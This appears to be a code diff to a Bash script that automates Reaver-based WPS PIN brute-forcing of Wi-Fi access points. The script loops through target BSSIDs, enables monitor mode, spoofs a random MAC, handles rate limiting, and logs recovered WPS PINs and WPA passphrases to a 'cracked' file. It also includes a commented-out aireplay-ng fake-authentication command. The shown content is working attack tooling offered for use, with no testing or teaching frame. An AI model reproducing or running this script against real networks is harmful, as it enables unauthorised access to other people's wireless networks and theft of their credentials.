@@ -13,7 +13,6 @@
 ###### In the end, after it loops all BSSID list, the script will exit after stoping Monitor Mode, reseting device driver and
 ###### restarting Netwok Manager service, systemctl restart NetworkManager .
 ###### Found PINS are stored in CRACKED directory.
-###### I've used DominikStyp AutoReaver as inspiration, check his at git clone https://github.com/DominikStyp/auto-reaver.git
 ###################################################################################################################################################
 ###### REQUIREMENTS:
 ###### Reaver v1.6.6 (the version im using, dont know with older versions)
@@ -90,9 +89,9 @@ setDeviceSettings(){
 	        read -p "Choose WIFI Device: " WIFICHOICE;
 
 		if [[ $WIFICHOICE -le ${#ARR_DEVICES[@]}/3 && $WIFICHOICE -gt 0 ]]; then
-			WIFI_CARD_DRIVER="${ARR_DEVICES[(wifiChoice*3)-1]}";
-			WIFI_CARD_LOGICAL="${ARR_DEVICES[(wifiChoice*3)-2]}";
-			WIFI_CARD_PHY="${ARR_DEVICES[(wifiChoice*3)-3]}";
+			WIFI_CARD_DRIVER="${ARR_DEVICES[(WIFICHOICE*3)-1]}";
+			WIFI_CARD_LOGICAL="${ARR_DEVICES[(WIFICHOICE*3)-2]}";
+			WIFI_CARD_PHY="${ARR_DEVICES[(WIFICHOICE*3)-3]}";
 			break;
 		else
 			echo "InValid Selection...";
@@ -100,7 +99,7 @@ setDeviceSettings(){
 	done
 
 	echo "";
-		echoBlue "Checking if Selected Device is in Monitor Mode......";
+	echoBlue "Checking if Selected Device is in Monitor Mode......";
 	echo "";
 
 	getMonitorName;
@@ -428,8 +427,12 @@ checkRequisites(){
 exitAutoReaver(){
 	local netManagerStatus;
 
+        if [ -z "$WIFI_CARD_MONITOR" ]; then
+                getMonitorName;
+        fi
+
         if [ ! -z "$WIFI_CARD_MONITOR" ]; then
-                stopMonitor;
+		stopMonitor
         fi
 
 	if [ ! -z "$WIFI_CARD_DRIVER" ]; then
@@ -533,35 +536,41 @@ done
 
 clear;
 
-SESSION_FILE=$REAVER_SESSION_DIR'/'$AP_ESSID'_SESSION.wpc';
-BSSID_LIMIT_FILE=$REAVER_TMP_DIR'/'$AP_ESSID'_LIMIT';
-CRACKED_FILE=$REAVER_CRACKED_DIR'/'$AP_ESSID'_PIN';
-
 stopMonitor && resetDeviceDriver && getRandomMac &&  startMonitor;
 
-while true; do
-	CMD_FAUTH="konsole -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID ${WIFI_CARD_MONITOR}'";
-	eval $CMD_FAUTH 2>/dev/null
+SESSION_FILE=$REAVER_SESSION_DIR'/'$AP_ESSID'.session';
+BSSID_CLEAR=$(echo $AP_BSSID | sed s/://g);
+BSSID_LIMIT_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'_limit';
+BSSID_LAST_PIN_DATE_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'_date';
+touch $CHECK_ACTIVITY_FILE && chmod 600 $CHECK_ACTIVITY_FILE;
 
-	CMD_REAVER="reaver -i ${WIFI_CARD_MONITOR} -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS";
+while true; do
+#	CMD_FAUTH="konsole --background-mode -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $WIFI_CARD_MONITOR'";
+#	echo "$CMD_FAUTH" && eval $CMD_FAUTH >>/dev/null
+	CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS";
 	echoWhite "$CMD_REAVER" && eval $CMD_REAVER \
 	| perl -lane '
-		if (/AP rate limiting/){
+		if (/'$REAVER_CHECKED_PIN_PERL_REGEXP'/){
+			system("echo \$(date +%s) >> '$BSSID_LAST_PIN_DATE_FILE'");
+		}
+		if (/'$REAVER_ACTIVITY_PERL_REGEXP'/){
+			system("touch '$CHECK_ACTIVITY_FILE'");
+		}
+		elsif (/AP rate limiting/){
 			system("touch '$BSSID_LIMIT_FILE'");
-			# sending -INT signal acts like CTRL + C shortcut
 			system("killall -INT reaver");
 			print $_,"\n[+] Session saved";
 			exit 1;
 		}
 		elsif (/WPS PIN/){
-			open FILE, ">>'$CRACKED_FILE'";
+			open FILE, ">>'$CRACKED_LIST_FILE'";
 			print FILE "-----PIN----'$AP_BSSID' ('$AP_ESSID')-----------";
 			print FILE $_;
 			close FILE;
 			REAVER_GET_KEY=1;
 		}
 		elsif (/WPA PSK/){
-			open FILE, ">>'$CRACKED_FILE'";
+			open FILE, ">>'$CRACKED_LIST_FILE'";
 			print FILE "-----PASSPHRASE----'$AP_BSSID' ('AP_$ESSID')-----------";
 			print FILE $_;
 			close FILE;
